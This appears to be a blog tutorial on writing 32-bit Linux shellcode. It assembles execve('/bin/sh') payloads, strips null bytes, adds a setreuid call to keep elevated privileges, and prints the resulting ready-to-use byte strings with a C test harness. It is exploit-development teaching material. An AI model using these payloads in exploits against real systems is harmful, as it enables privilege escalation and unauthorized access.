---
layout: post
title: "IA-32 Linux Shellcode Basics 2"
date: 2015-06-26 11:08:30 +0200
comments: true
categories: [exploit, shellcode]
---
Starting with the ASM code that is position dependent:
{% codeblock lang:asm shell1.asm %}
section .data
cmd db '/bin/sh',0x0

section .text
global _start
_start:

;execve("/bin/sh", {"/bin/sh", NULL}, NULL)
mov eax, 11
lea ebx, [cmd]
mov ecx, 0
push ecx
push ebx
mov ecx, esp
mov edx, 0
int 0x80
{% endcodeblock %}

{% codeblock %}
root@kali32:/tmp# nasm -f elf shell1.asm; ld shell1.o -o shell1

root@kali32:/tmp# ./shell1 
# 
{% endcodeblock %}

{% codeblock %}
root@kali32:/tmp# objdump -M intel -d shell1

shell1:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:	b8 0b 00 00 00       	mov    eax,0xb
 8048085:	8d 1d 9c 90 04 08    	lea    ebx,ds:0x804909c
 804808b:	b9 00 00 00 00       	mov    ecx,0x0
 8048090:	51                   	push   ecx
 8048091:	53                   	push   ebx
 8048092:	89 e1                	mov    ecx,esp
 8048094:	ba 00 00 00 00       	mov    edx,0x0
 8048099:	cd 80                	int    0x80
{% endcodeblock %}

The minimalistic shell could look like `execve("/bin/sh", NULL, NULL)`.
However, according documentation it's not portable among UNIX systems:

{% codeblock %}
man 2 execve

  On Linux, argv can be specified as NULL, which has the same effect as
  specifying this argument as a pointer to a list containing a single NULL
  pointer.  Do not take advantage of this  misfea‐ ture!  It is nonstandard and
  nonportable: on most other UNIX systems doing this will result in an error
  (EFAULT).
{% endcodeblock %}

Again, the same procedure. We need to get rid of absolute address reference and
NULL bytes.

{% codeblock lang:asm shell2.asm %}
section .text
global _start
_start:

;execve("/bin/sh", {"/bin/sh", NULL}, NULL)
xor eax, eax
xor edx, edx

push eax ; \0
push 'n/sh'
push '//bi'
mov ebx, esp

push eax ; \0
push ebx ; /bin/sh
mov ecx, esp

mov  al, 11
int 0x80
{% endcodeblock %}

{% codeblock %}
root@kali32:/tmp# nasm -f elf shell2.asm; ld shell2.o -o shell2

root@kali32:/tmp# ./shell2 
# 
{% endcodeblock %}

Before we dump our opcodes, we add `setreuid(geteuid(), geteuid()` call:

{% codeblock lang:asm shell3.asm %}
section .text
global _start
_start:

; geteuid
push byte 49
pop eax
int 0x80

; setreuid(geteuid(), geteuid()
mov ebx, eax
mov ecx, eax
push byte 70
pop eax
int 0x80

;execve("/bin/sh", {"/bin/sh", NULL}, NULL)
xor eax, eax
xor edx, edx

push eax ; \0
push 'n/sh'
push '//bi'
mov ebx, esp

push eax ; \0
push ebx ; /bin/sh
mov ecx, esp

mov  al, 11
int 0x80
{% endcodeblock %}

{% codeblock %}
root@kali32:/tmp# nasm -f elf shell3.asm; ld shell3.o -o shell3

root@kali32:/tmp# ./shell3 
{% endcodeblock %}

{% codeblock %}
root@kali32:/tmp# objdump -M intel -d shell3

shell3:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	6a 31                	push   0x31
 8048062:	58                   	pop    eax
 8048063:	cd 80                	int    0x80
 8048065:	89 c3                	mov    ebx,eax
 8048067:	89 c1                	mov    ecx,eax
 8048069:	6a 46                	push   0x46
 804806b:	58                   	pop    eax
 804806c:	cd 80                	int    0x80
 804806e:	31 c0                	xor    eax,eax
 8048070:	31 d2                	xor    edx,edx
 8048072:	50                   	push   eax
 8048073:	68 6e 2f 73 68       	push   0x68732f6e
 8048078:	68 2f 2f 62 69       	push   0x69622f2f
 804807d:	89 e3                	mov    ebx,esp
 804807f:	50                   	push   eax
 8048080:	53                   	push   ebx
 8048081:	89 e1                	mov    ecx,esp
 8048083:	b0 0b                	mov    al,0xb
 8048085:	cd 80                	int    0x80
{% endcodeblock %}

Analogously as before:
{% codeblock %}
root@kali32:/tmp# objdump -d shell3 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
{% endcodeblock %}

{% codeblock %}
root@kali32:/tmp# sc=$(objdump -d shell3 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d '')

root@kali32:/tmp# echo $sc | ruby -e 'print $stdin.read.scan(/\\x(..)/).flatten.map{ |x| x.to_i(16).chr }.join' > shellcode
{% endcodeblock %}

{% codeblock %}
#include <sys/mman.h>
#include <string.h>
#include <stdio.h>

char sc[]= "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(){
        void * a = mmap(0, 4096, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); 
        printf("allocated executable memory at: %p\n", a); 
        printf("shellcode length: %d\n", strlen(sc)); 
        ((void (*)(void)) memcpy(a, sc, sizeof(sc)))();
}
{% endcodeblock %}

{% codeblock %}
root@kali32:/tmp# gcc test.c -o test
root@kali32:/tmp# ./test 
allocated executable memory at: 0xb76f7000
shellcode length: 39
# 
{% endcodeblock %}

Alternatively we can obtain string reference with `call` instruction:

{% codeblock lang:asm shell4.asm %}
section .text
global _start
_start:

; geteuid
push byte 49
pop eax
int 0x80

; setreuid(geteuid(), geteuid()
mov ebx, eax
mov ecx, eax
push byte 70
pop eax
int 0x80

;execve("/bin/sh", NULL, NULL);
xor eax, eax
xor ecx, ecx
xor edx, edx

jmp short string_loc

string_loc_ret:
pop ebx
mov [ebx+7], cl ; rewrite N with \0

push edx; \0
push ebx; /bin/sh
mov esp, ecx

mov al, 11
int 0x80

string_loc:
call string_loc_ret ; this put the (return) address of the string to the top of the stack
db '/bin/shN'
{% endcodeblock %}


{% codeblock %}
root@kali32:/tmp# nasm -f elf shell4.asm; ld shell4.o -o shell4

root@kali32:/tmp# ./shell4
Segmentation fault
{% endcodeblock %}

The segfault is normal and it's because we are trying to overwrite the code
segment at the line `mov BYTE PTR [ebx+0x7],cl`. Because our shellcode will be
loaded on stack, that doesn't mean any complication.

{% codeblock %}
root@kali32:/tmp# objdump -M intel -d shell4

shell4:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	6a 31                	push   0x31
 8048062:	58                   	pop    eax
 8048063:	cd 80                	int    0x80
 8048065:	89 c3                	mov    ebx,eax
 8048067:	89 c1                	mov    ecx,eax
 8048069:	6a 46                	push   0x46
 804806b:	58                   	pop    eax
 804806c:	cd 80                	int    0x80
 804806e:	31 c0                	xor    eax,eax
 8048070:	31 c9                	xor    ecx,ecx
 8048072:	31 d2                	xor    edx,edx
 8048074:	eb 0c                	jmp    8048082 <string_loc>

08048076 <string_loc_ret>:
 8048076:	5b                   	pop    ebx
 8048077:	88 4b 07             	mov    BYTE PTR [ebx+0x7],cl
 804807a:	52                   	push   edx
 804807b:	53                   	push   ebx
 804807c:	89 cc                	mov    esp,ecx
 804807e:	b0 0b                	mov    al,0xb
 8048080:	cd 80                	int    0x80

08048082 <string_loc>:
 8048082:	e8 ef ff ff ff       	call   8048076 <string_loc_ret>
 8048087:	2f                   	das    
 8048088:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
 804808b:	2f                   	das    
 804808c:	73 68                	jae    80480f6 <string_loc+0x74>
 804808e:	4e                   	dec    esi
{% endcodeblock %}

{% codeblock %}
root@kali32:/tmp# objdump -d shell4 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e
{% endcodeblock %}

{% codeblock lang:c test.c %}
#include <sys/mman.h>
#include <string.h>
#include <stdio.h>

char sc[]= "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e";

int main(){
        void * a = mmap(0, 4096, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); 
        printf("allocated executable memory at: %p\n", a); 
        printf("shellcode length: %d\n", strlen(sc)); 
        ((void (*)(void)) memcpy(a, sc, sizeof(sc)))();
}
{% endcodeblock %}

{% codeblock %}
root@kali32:/tmp# ./test 
allocated executable memory at: 0xb7789000
shellcode length: 47
# 
{% endcodeblock %}

